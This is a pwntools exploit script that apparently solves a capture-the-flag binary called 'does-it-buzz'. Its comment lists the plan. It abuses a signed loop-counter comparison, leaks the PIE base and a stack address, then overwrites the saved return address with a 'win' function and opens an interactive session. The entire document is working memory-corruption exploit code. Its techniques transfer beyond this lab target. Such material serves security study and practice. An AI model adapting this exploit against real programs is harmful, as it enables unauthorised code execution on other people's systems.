from pwn import *

'''
1. use sign cmp to control loop
2. leak binary address
3. leak stack address
4. overwrite sip with win addr
'''

context.binary = elf = ELF('/challenge/does-it-buzz', checksec = False)

io = elf.process()

loop_counter_offset = 0x38

leak_binaddr_payload = b'A' * loop_counter_offset + p32(constants.INT32_MAX * 2 + 1)

io.send(leak_binaddr_payload)

fizzbuzz_offset = 0x4098
io.recvuntil(leak_binaddr_payload)
pie_addr = u64(io.recvline(keepends = False).ljust(8, b'\x00'))
pie_base = pie_addr - fizzbuzz_offset
print(f'[=] pie base address: {hex(pie_base)}')

io.send(b'A' * loop_counter_offset + p32(4))

leak_stackaddr_payload = b'A' * loop_counter_offset + p32(constants.INT32_MAX * 2 + 1)
io.send(leak_stackaddr_payload)
io.recvuntil(leak_stackaddr_payload)
stack_addr = u64(io.recvline(keepends = False).ljust(8, b'\x00'))
print(f'[=] buffer address (+0x44): {hex(stack_addr)}')

win_offset = 0x12c9
buffer_winaddr_offset = 0x11 - 0x40 # 0x10 + 1, +1 that first byte will be overwrite to zero
buffer_sip_offset = 0x74 - 0x40
sip_payload = b'A' + p64(pie_base + win_offset) + b'B' * (loop_counter_offset - 9) + p32(16) + p64(stack_addr + buffer_winaddr_offset) + p64(stack_addr + buffer_sip_offset)

io.send(sip_payload)

io.interactive()
